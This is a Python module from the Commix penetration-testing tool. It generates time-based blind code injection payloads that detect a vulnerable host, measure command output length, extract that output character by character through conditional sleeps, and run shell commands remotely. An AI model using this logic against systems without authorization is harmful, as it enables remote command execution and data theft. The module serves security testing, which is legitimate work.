#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The "time-based" injection technique on Blind Code Injection.
The available "time-based" payloads.

Nothing here spells out a language: the expressions come from the grammar of whichever one is being
evaluated, so the same payloads serve any of them. One payload also serves either operating system,
since the shell underneath is only ever asked to run the command.
"""

# The command's output, with trailing newlines dropped the way a shell's own substitution drops
# them - the length reported here has to be the length every other technique reports.
def _output(cmd):
  return settings.EVAL_GRAMMAR.trim(settings.EVAL_GRAMMAR.run(cmd))

# A statement terminator, where the boundary being tested can carry one.
def _end(separator):
  return settings.EVAL_GRAMMAR.TERMINATOR if separator else ""

# Delay only while the condition holds: a boolean times the delay is the delay or nothing at all.
def _conditional_sleep(condition, timesec, separator):
  # Whole seconds: the delay is counted in them, and a fractional one only reads as noise.
  return settings.EVAL_GRAMMAR.delay(int(timesec), condition) + _end(separator)

# The shell's comparison operators, as the languages being evaluated spell them.
COMPARISON = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "==", "-ne": "!="}

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  condition = str(output_length) + "==" + settings.EVAL_GRAMMAR.length(_output("echo " + TAG))
  return _conditional_sleep(condition, timesec, separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, output_length, timesec, http_request_method):
  return decision(separator, TAG, output_length, timesec, http_request_method)

"""
Delay while a condition of the caller's own holds.
"""
def condition_check(separator, condition, timesec, http_request_method):
  # Stated in the shell's spelling, as every other technique states it, so it is rewritten first.
  for shell_operator, operator in COMPARISON.items():
    condition = condition.replace(settings.SINGLE_WHITESPACE + shell_operator + settings.SINGLE_WHITESPACE, operator)
  return _conditional_sleep(condition, timesec, separator)

"""
Get the execution output length, of shell execution.
"""
def get_length(separator, cmd, candidate_length, timesec, http_request_method):
  settings.USER_APPLIED_CMD = cmd
  condition = str(candidate_length) + "<=" + settings.EVAL_GRAMMAR.length(_output(cmd))
  return _conditional_sleep(condition, timesec, separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http_request_method):
  return get_length(separator, cmd, candidate_length, timesec, http_request_method)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  # The guess stays left of the operator, as it does elsewhere: the search reads the answer as "the
  # byte is at or above this", and an operand order of its own would send it into the wrong half.
  ordinal = settings.EVAL_GRAMMAR.ordinal(_output(cmd), num_of_chars - 1)
  return _conditional_sleep(str(ascii_char) + COMPARISON.get(operator, "<=") + ordinal, timesec, separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  return get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  settings.USER_APPLIED_CMD = cmd
  condition = str(output_length) + "<=" + settings.EVAL_GRAMMAR.length(_output(cmd))
  return _conditional_sleep(condition, timesec, separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method):
  return cmd_execution(separator, cmd, output_length, timesec, http_request_method)

"""
Check for false positive result.

The command asked for here computes a small sum, and the caller looks for that sum among the values
it could have produced - so what is compared is the output read as a number, not the ordinal of a
byte of it. Asked the other way, the digit '5' answers 53 and no candidate ever matches.
"""
def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  condition = str(ascii_char) + "==" + settings.EVAL_GRAMMAR.to_number(_output(cmd))
  return _conditional_sleep(condition, timesec, separator)

# eof
